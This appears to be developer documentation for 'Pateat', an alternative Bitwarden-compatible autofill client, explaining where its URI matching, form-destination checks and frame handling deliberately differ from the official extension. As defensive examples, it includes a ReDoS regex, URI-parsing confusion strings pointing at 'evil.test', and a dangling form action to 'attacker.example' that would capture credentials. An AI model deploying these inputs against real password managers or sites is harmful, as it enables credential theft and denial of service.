# Differences from the official Bitwarden clients

This page is the one place that lists where Pateat behaves differently from the official
Bitwarden browser extension on purpose. Each entry links the official code at a pinned
commit, or Bitwarden's documentation, that shows its behavior, says what Pateat does and
where that is specified, and why. Entries are to be reconsidered later unless they name
an owner's decision. Behavior that matches the official clients, such as matching a page
URL at any length, is not listed. Add a new difference here in the PR that introduces
it.

## URI matching

Pateat's side is `createEvaluator` in `packages/bitwarden/src/uri.ts`
([Architecture](architecture.md)). Official code is pinned at
[`8246ae9`](https://github.com/bitwarden/clients/tree/8246ae9c9a484a0a69f8b27203034555fb872523).

- Regex URIs (`match` 4) are not evaluated. The official clients run
  `new RegExp(uri, "i").test(pageUrl)`
  ([login-uri.view.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/vault/models/view/login-uri.view.ts#L177-L186))
  in the browser extension's background, for example while building the inline menu
  ([overlay.background.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/apps/browser/src/autofill/background/overlay.background.ts#L583)),
  with no timeout, input limit or pattern check; their only guard is a warning that the
  mode risks exposing credentials
  ([messages.json](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/apps/browser/src/_locales/en/messages.json#L5901-L5904)).
  A backtracking pattern takes exponentially longer as the page URL grows: testing
  `new RegExp("(a+)+$", "i")` against `https://example.com/?q=` followed by `a`s and a
  `!` doubles in time with each extra `a`, and took 18 seconds with 30 of them in Node
  26 on 2026-10-19. Pateat matches inside the crypto Worker that holds the vault
  session, so one such pattern would block every login. Such a URI is reported as
  `unsupported-uri-match` on every page but an `http:` one, where only URIs saved with
  `http://` count, so its item counts as unevaluated rather than as no match. While that
  item is eligible, every HTTPS page where Pateat would choose the account by URI match
  refuses as `item-uri-unevaluated`, even when that item is for another site; a saved
  default or popup pick refuses only when its own item has such a URI. Proposal, not
  decided: evaluate Regex with a linear-time engine of the RE2 family, which refuses
  backreferences and lookaround, or in a separate Worker stopped after a time limit.
- When equivalent domains or the organization default-match policy cannot be read
  consistently, affected URIs are reported unavailable. The official clients continue
  with Domain as the default
  ([login-uri.view.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/vault/models/view/login-uri.view.ts#L154-L155))
  and with the page's own domain alone
  ([login-uri.view.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/vault/models/view/login-uri.view.ts#L163-L164)).
  One string entry of a group that is not a hostname is not such a case: it is ignored,
  as the official clients effectively do.
- The official clients' device-local default match setting
  ([cipher.service.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/vault/services/cipher.service.ts#L507-L512))
  is not visible to Pateat; Domain is used unless an enforced organization policy
  applies.
- On an `http:` page only a URI saved with `http://` matches, and the official clients'
  warning case never fills ([ADR 0050](adr/0050-http-pages-for-http-items.md)). The
  official extension fills on an `http:` page and warns first when the item's URI is
  saved as `https://` ([Bitwarden help](https://bitwarden.com/help/auto-fill-browser/)).
- A stored URI whose scheme is neither `http` nor `https`, such as `ftp://example.com`,
  never matches (`unsupported-uri-scheme`) and does not make its item unevaluated. The
  official clients read its domain with tldts for Domain
  ([utils.ts `getDomain`](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/platform/misc/utils.ts#L483-L517))
  and parse any `scheme://` URI with `URL` for Host
  ([utils.ts `getUrlObject`](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/platform/misc/utils.ts#L827-L850)),
  so both can match it: `ftp://example.com` gives `example.com` either way.
- A stored URI with a backslash in a bare host, such as `bank.example\@evil.test`, is
  reported invalid. The official clients match it as `evil.test` with Domain, which
  reads it with tldts
  ([utils.ts `getDomain`](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/platform/misc/utils.ts#L483-L517)),
  and as `bank.example` with Host, which reads it with `URL`
  ([utils.ts `getUrlObject`](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/platform/misc/utils.ts#L827-L850)).
  A backslash right after the scheme is also invalid: the official clients match
  `https://\bank.example` as `bank.example`, and `https:\\bank.example` or
  `https:/\bank.example` as `bank.example` with Domain but `https` with Host.
- A stored URI holding a control character, or a user name before `@` in its
  authority, is `invalid-uri` and ignored. The official clients pass it to `URL`
  ([utils.ts](https://github.com/bitwarden/clients/blob/8246ae9c9a484a0a69f8b27203034555fb872523/libs/common/src/platform/misc/utils.ts#L827-L850)),
  which strips tabs and newlines and keeps the user name.
- A stored URI over 8192 characters is `invalid-uri`. The official clients have no such
  limit, but the Bitwarden server stores at most 10,000 encrypted characters for one
  ([CipherLoginModel.cs](https://github.com/bitwarden/server/blob/9129efbd1531d5d8472345638efad7ef25a7337a/src/Api/Vault/Models/CipherLoginModel.cs#L84-L86)),
  so no synced URI reaches it.

## Form destination

Official code is pinned at
[`abccf1e`](https://github.com/bitwarden/clients/tree/abccf1e342dccba06a3cc635cd4c706defa64a32).
Pateat's rule is in [Background execution](architecture.md#background-execution).

- The official clients never check where a form submits before filling or
  auto-submitting it. `getFormActionAttribute` only resolves the action
  ([collect-autofill-content.service.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/services/collect-autofill-content.service.ts#L735-L741))
  for form-classification keywords and a debugging report
  ([qualification.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/utils/qualification.ts#L126-L130)),
  no code reads a button's `formaction`, and auto-submit clicks a submit button it finds
  or calls `requestSubmit()` without looking at the destination
  ([auto-submit-login.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/content/auto-submit-login.ts#L133-L142)).
  Pateat refuses a fill, or a click that submits a form, with `form-off-origin` unless
  the destination (for a fill the form's `action`; for a click the submitter's
  `formaction`, else the form's `action`; resolved against the document's base URL) has
  the document's origin; `data:`, `vbscript:` and
  unparsable values are refused. Injected markup on an admitted page, such as a dangling
  `<form action="https://attacker.example/">` or a `<base href>`, would otherwise
  receive the username and password. Pending (owner's choice on 2026-10-19 at
  01:29 UTC, not yet implemented): a destination on another host of the same site will
  also be allowed when the login's Bitwarden item matches the destination URL;
  cross-site destinations stay refused.
- A `javascript:` form action is allowed for fill and click (owner's decision,
  2026-10-18 04:19 UTC), as the official clients fill such a form like any other (their
  action handling above has no case for it). Chrome refuses to run the `javascript:` URL
  itself when the content script's click submits the form (the isolated world's
  `script-src 'self'`), so only forms whose own handlers sign in work;
  `action="javascript:doLogin()"` does not.

## Frames

- When a frame's URL does not match the item, the official clients ask with `confirm()`
  before filling
  ([autofill.service.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/services/autofill.service.ts#L1545-L1568),
  [insert-autofill-content.service.ts](https://github.com/bitwarden/clients/blob/abccf1e342dccba06a3cc635cd4c706defa64a32/apps/browser/src/autofill/services/insert-autofill-content.service.ts#L108-L120))
  and block only autofill on page load. Pateat refuses with `frame-top-mismatch` unless
  the item matches both the frame's URL and the tab's URL
  ([ADR 0017](adr/0017-login-forms-in-frames.md)): no person is there to answer a
  prompt during an automatic login.
